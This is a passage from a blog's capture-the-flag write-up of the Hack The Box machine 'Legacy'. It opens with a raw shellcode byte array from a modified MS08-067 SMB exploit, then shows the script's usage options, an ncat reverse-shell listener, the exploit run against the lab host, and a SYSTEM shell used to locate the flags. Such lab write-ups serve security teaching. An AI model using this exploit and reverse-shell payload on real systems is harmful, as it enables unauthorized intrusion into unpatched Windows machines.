<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xcb\xb7\xe2\xd5\x8e\xca\xe3\xdf\x10\x73\xe6</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd1\xb5\x18\xab\x65\x62\xce\xd1\xbd\xdd\x93</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb9\xe6\x98\xe0\x8b\xd1\xbb\xfb\xf5\xf9\xc9</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x94\x46\x5b\x57\x03\xb8\x8e\xef\xba\x7d\xda</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xbf\xfb\x90\x0e\x84\x93\x46\x5b\xbf\xc3\xe9</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xde\xaf\xc3\xf9\xde\x87\x79\xb6\x51\x0f\x6c</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x6c\x19\x85\x96\xd1\x84\xe5\x9d\x98\xe6\xed</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x93\xa8\xdf\x66\x75\xd3\x9e\xb9\xc4\xd1\x17</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4a\xe7\xd8\x71\x3a\x16\x79\xfa\xe3\x6c\xf7</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x86\x9a\x7f\xd1\x7e\x5a\x31\xef\x71\x3a\xfb</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xda\xe3\x8b\x93\x30\x6d\xb8\xc4\xee\xbf\x19</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf9\xab\xd7\xb9\x71\x44\xe8\x28\xd7\x9d\xb2</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xee\x92\x34\xca\xcb\x83\x7f\x8e\xab\xc7\xe9</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd8\xb9\xc5\xff\xd8\xa1\xc5\xef\xdd\xb9\xfb</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc0\x42\xd0\x15\x46\x5b\x66\x73\xf7\xd8\xa9</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x6c\x89\xe6\xe7\x14\xa4\xee\x10\x46\x02\x6e</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf2\xb9\xb3\xe6\x49\x06\x04\x13\x10\x46\x85</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x88\x93\x99\x39\x75\x0f\xe6\xbc\x35\xa8\x80</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xcb\xe1\x85\x93\xea\x71\x3a</span><span class="s2">&quot;</span>

<span class="c1"># ------------------------------------------------------------------------</span>
</pre></div>


<p>Executing the script without any arguments reveals the usage isntructions.</p>
<div class="highlight"><pre><span></span>/ms08_067# python ./ms08_067_2018.py 
<span class="c1">#######################################################################</span>
<span class="c1">#   MS08-067 Exploit</span>
<span class="c1">#   This is a modified verion of Debasis Mohanty&#39;s code (https://www.exploit-db.com/exploits/7132/).</span>
<span class="c1">#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi</span>
<span class="c1">#</span>
<span class="c1">#   Mod in 2018 by Andy Acer:</span>
<span class="c1">#   - Added support for selecting a target port at the command line.</span>
<span class="c1">#     It seemed that only 445 was previously supported.</span>
<span class="c1">#   - Changed library calls to correctly establish a NetBIOS session for SMB transport</span>
<span class="c1">#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste</span>
<span class="c1">#     into this source file.</span>
<span class="c1">#######################################################################</span>


Usage: ./ms08_067_2018.py &lt;target ip&gt; &lt;os <span class="c1">#&gt; &lt;Port #&gt;</span>

Example: MS08_067_2018.py <span class="m">192</span>.168.1.1 <span class="m">1</span> <span class="m">445</span> -- <span class="k">for</span> Windows XP SP0/SP1 Universal, port <span class="m">445</span>
Example: MS08_067_2018.py <span class="m">192</span>.168.1.1 <span class="m">2</span> <span class="m">139</span> -- <span class="k">for</span> Windows <span class="m">2000</span> Universal, port <span class="m">139</span> <span class="o">(</span><span class="m">445</span> could also be used<span class="o">)</span>
Example: MS08_067_2018.py <span class="m">192</span>.168.1.1 <span class="m">3</span> <span class="m">445</span> -- <span class="k">for</span> Windows <span class="m">2003</span> SP0 Universal
Example: MS08_067_2018.py <span class="m">192</span>.168.1.1 <span class="m">4</span> <span class="m">445</span> -- <span class="k">for</span> Windows <span class="m">2003</span> SP1 English
Example: MS08_067_2018.py <span class="m">192</span>.168.1.1 <span class="m">5</span> <span class="m">445</span> -- <span class="k">for</span> Windows XP SP3 French <span class="o">(</span>NX<span class="o">)</span>
Example: MS08_067_2018.py <span class="m">192</span>.168.1.1 <span class="m">6</span> <span class="m">445</span> -- <span class="k">for</span> Windows XP SP3 English <span class="o">(</span>NX<span class="o">)</span>
Example: MS08_067_2018.py <span class="m">192</span>.168.1.1 <span class="m">7</span> <span class="m">445</span> -- <span class="k">for</span> Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>

Also: nmap has a good OS discovery script that pairs well with this exploit:
nmap -p <span class="m">139</span>,445 --script-args<span class="o">=</span><span class="nv">unsafe</span><span class="o">=</span><span class="m">1</span> --script /usr/share/nmap/scripts/smb-os-discovery <span class="m">192</span>.168.1.1
</pre></div>


<p>Of note are the several <code>os #</code> options; it looks like the exact exploitation is language-dependent.  Legacy is an English box, so the most likely exploits should be 6 or 7.</p>
<p>First, we need to set up an Ncat listener (I use <code>rlwrap</code> for <a href="https://twitter.com/pix/status/1198688097665503232">fancy features</a>).  Remember to set the port to the one you specified for your shellcode.</p>
<div class="highlight"><pre><span></span><span class="c1"># rlwrap ncat -nvlp 4433</span>
Ncat: Version <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4433
Ncat: Listening on <span class="m">0</span>.0.0.0:4433
</pre></div>


<p>Next, we execute the python exploit with the target IP, OS #, and port.  I will be attempting 6 first.</p>
<h4>Executing the exploit to get a reverse shell</h4>
<div class="highlight"><pre><span></span>/ms08_067# python ./ms08_067_2018.py <span class="m">10</span>.10.10.4 <span class="m">6</span> <span class="m">445</span><span class="c1">#######################################################################</span>
<span class="c1">#   MS08-067 Exploit</span>
<span class="o">[</span>SNIP<span class="o">]</span>

Windows XP SP3 English <span class="o">(</span>NX<span class="o">)</span>

<span class="o">[</span>-<span class="o">]</span>Initiating connection
<span class="o">[</span>-<span class="o">]</span>connected to ncacn_np:10.10.10.4<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\b</span>rowser<span class="o">]</span>
Exploit finish
</pre></div>


<p>Back in the listener:</p>
<div class="highlight"><pre><span></span>Ncat: Connection from <span class="m">10</span>.10.10.4.
Ncat: Connection from <span class="m">10</span>.10.10.4:1028.
Microsoft Windows XP <span class="o">[</span>Version <span class="m">5</span>.1.2600<span class="o">]</span>
<span class="o">(</span>C<span class="o">)</span> Copyright <span class="m">1985</span>-2001 Microsoft Corp.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
</pre></div>


<p>Shell on first try!</p>
<div class="highlight"><pre><span></span>C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami <span class="p">&amp;</span> hostname
whoami <span class="p">&amp;</span> hostname
<span class="s1">&#39;whoami&#39;</span> is not recognized as an internal or external command,
operable program or batch file.
legacy
</pre></div>


<p>The error displayed from <code>whoami</code>, combined with the knowledge that this is an SMB exploit, are good indicators that this process is running as <code>NT AUTHORITY\SYSTEM</code>.</p>
<p>We can locate the <code>user.txt</code> and <code>root.txt</code> flags in the john and Administrator user directories respectively.</p>
<div class="highlight"><pre><span></span>C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;dir <span class="s2">&quot;C:\Documents and Settings\john\Desktop&quot;</span>
dir <span class="s2">&quot;C:\Documents and Settings\john\Desktop&quot;</span>
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:<span class="se">\D</span>ocuments and Settings<span class="se">\j</span>ohn<span class="se">\D</span>esktop

<span class="m">16</span>/03/2017  <span class="m">08</span>:19     &lt;DIR&gt;          .
<span class="m">16</span>/03/2017  <span class="m">08</span>:19     &lt;DIR&gt;          ..
<span class="m">16</span>/03/2017  <span class="m">08</span>:19                 <span class="m">32</span> user.txt
               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>             <span class="m">32</span> bytes
               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>   <span class="m">6</span>.485.225.472 bytes free

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;dir <span class="s2">&quot;C:\Documents and Settings\Administrator\Desktop&quot;</span>
dir <span class="s2">&quot;C:\Documents and Settings\Administrator\Desktop&quot;</span>
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\D</span>esktop

<span class="m">16</span>/03/2017  <span class="m">08</span>:18     &lt;DIR&gt;          .
<span class="m">16</span>/03/2017  <span class="m">08</span>:18     &lt;DIR&gt;          ..
<span class="m">16</span>/03/2017  <span class="m">08</span>:18                 <span class="m">32</span> root.txt
               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>             <span class="m">32</span> bytes
               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>   <span class="m">6</span>.485.225.472 bytes free
</pre></div>


<p>Thus concludes Legacy.  Thank you for reading!</p>
            <div class="hr"></div>
            <a href="#" class="go-top">Go Top</a>
<footer class="footer">
    <p>&copy; LogistyxCat &ndash;
        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
        for <a href="http://blog.getpelican.com/">Pelican</a>
    </p>
</footer>        </div>
    </div>
</div>
    <script>
        var $top = $('.go-top');

        // Show or hide the sticky footer button
        $(window).scroll(function() {
            if ($(this).scrollTop() > 200) {
                $top.fadeIn(200);
            } else {
                $top.fadeOut(200);
            }
        });

        // Animate the scroll to top
        $top.click(function(event) {
            event.preventDefault();
            $('html, body').animate({scrollTop: 0}, 300);
        })

        // Makes sure that the href="#" attached to the <a> elements
        // don't scroll you back up the page.
        $('body').on('click', 'a[href="#"]', function(event) {
            event.preventDefault();
        });
    </script>
</body>
</html>